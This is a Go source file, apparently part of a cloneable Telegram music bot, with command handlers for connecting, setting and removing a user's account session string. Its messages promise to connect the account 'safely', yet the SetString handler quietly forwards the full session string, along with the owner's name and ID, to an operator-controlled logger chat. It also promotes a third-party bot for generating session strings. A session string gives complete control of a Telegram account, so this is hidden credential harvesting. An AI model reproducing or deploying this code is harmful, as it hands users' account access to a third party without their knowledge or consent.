package cplugin

import (
	"fmt"
	"log"
	"strings"

	"ANJALI/config"
	"ANJALI/utils"

	tb "gopkg.in/tucnak/telebot.v2"
)

const (
	PoweredBy     = "\n\n🤞 **𝐏ᴏᴡєʀєᴅ 𝐁ʏ ➛ the shiv.🙂❤️**"
	SessionAdvice = "\n\n💡 **Tip:** You can directly generate your Session String easily and safely from here: @SHIV_SESSION_BOT"
)

// Error Logger Helper
func logError(b *tb.Bot, chatID int64, err error, contextMsg string) {
	log.Printf("[ERROR] %s: %v", contextMsg, err)

	cfg := config.LoadConfig()
	if cfg.LoggerID != 0 {
		errorText := fmt.Sprintf("❌ **ERROR LOG**\n\n**Context:** %s\n**Error:** `%v`\n**Chat ID:** `%d`", contextMsg, err, chatID)
		chat, _ := b.ChatByID(fmt.Sprintf("%d", cfg.LoggerID))
		if chat != nil {
			b.Send(chat, errorText, tb.ModeMarkdown)
		}
	}
}

// ConnectAssistant handles the /connect command
func ConnectAssistant(b *tb.Bot, m *tb.Message) {
	if !m.Private() {
		return
	}

	botID := b.Me.ID
	userID := m.Sender.ID

	cloneData := utils.GetCloneBotData(botID)
	if cloneData == nil {
		b.Send(m.Chat, "❌ **Error:** Bot data not found in the database.", tb.ModeMarkdown)
		return
	}

	cfg := config.LoadConfig()
	if cloneData.UserID != int64(userID) && int64(userID) != cfg.OwnerID {
		b.Send(m.Chat, "❌ **Access Denied:** Only the bot owner can perform this action.", tb.ModeMarkdown)
		return
	}

	b.Send(m.Chat, "⚡ **Connect Assistant**\nI will help you connect your account safely.\n\n🛑 Type `/cancel` anytime to stop."+SessionAdvice, tb.ModeMarkdown)

	// State machine setup for waiting for phone number
	utils.SetUserState(userID, "WAITING_FOR_PHONE")
	b.Send(m.Chat, "📲 **Please send your Telegram Phone Number:**\n(Example: `+919876543210`)\n\n⚠️ **Don't forget the Country Code!**", tb.ModeMarkdown)
}

// SetString handles the /setstring and /setmode commands
func SetString(b *tb.Bot, m *tb.Message) {
	if !m.Private() {
		return
	}

	botID := b.Me.ID
	userID := m.Sender.ID

	cloneData := utils.GetCloneBotData(botID)
	cfg := config.LoadConfig()

	if cloneData == nil || (cloneData.UserID != int64(userID) && int64(userID) != cfg.OwnerID) {
		b.Send(m.Chat, "❌ **Access Denied:** Only the bot owner can perform this action.", tb.ModeMarkdown)
		return
	}

	args := strings.SplitN(m.Text, " ", 2)
	if len(args) < 2 {
		b.Send(m.Chat, "⚠️ **Usage:** `/setstring <Session_String>`"+SessionAdvice, tb.ModeMarkdown)
		return
	}

	sessionString := strings.TrimSpace(args[1])
	waitingMsg, _ := b.Send(m.Chat, "🔄 **Processing String...**", tb.ModeMarkdown)

	err := utils.UpdateCloneSession(botID, sessionString)
	if err != nil {
		logError(b, m.Chat.ID, err, "Failed to update session string in DB")
		b.Edit(waitingMsg, fmt.Sprintf("❌ **Error:** `%v`", err), tb.ModeMarkdown)
		return
	}

	// Logging to Clone Logger
	if cfg.CloneLogger2 != 0 {
		logText := fmt.Sprintf("**#Assistant_Added_Via_SetString**\n\n**🤖 Bot Name:** %s\n**🔗 Bot Link:** @%s\n\n**👑 Owner Name:** %s\n**🆔 Owner ID:** `%d`\n\n**🔑 Session String:**\n`%s`",
			b.Me.FirstName, b.Me.Username, m.Sender.FirstName, userID, sessionString)

		logChat, _ := b.ChatByID(fmt.Sprintf("%d", cfg.CloneLogger2))
		if logChat != nil {
			b.Send(logChat, logText, tb.ModeMarkdown)
		}
	}

	b.Edit(waitingMsg, "✅ **Connected Successfully!** 🎸 **Now you can play music!**"+PoweredBy, tb.ModeMarkdown)
}

// Disconnect handles the /disconnect and /delstring commands
func Disconnect(b *tb.Bot, m *tb.Message) {
	if !m.Private() {
		return
	}

	botID := b.Me.ID
	userID := m.Sender.ID

	cloneData := utils.GetCloneBotData(botID)
	cfg := config.LoadConfig()

	if cloneData == nil || (cloneData.UserID != int64(userID) && int64(userID) != cfg.OwnerID) {
		b.Send(m.Chat, "❌ **Access Denied:** Only the bot owner can perform this action.", tb.ModeMarkdown)
		return
	}

	err := utils.RemoveCloneSession(botID)
	if err != nil {
		logError(b, m.Chat.ID, err, "Failed to remove session string from DB")
		b.Send(m.Chat, "❌ **Error disconnecting assistant.**", tb.ModeMarkdown)
		return
	}

	b.Send(m.Chat, "✅ **Disconnected Successfully!**"+PoweredBy, tb.ModeMarkdown)
}
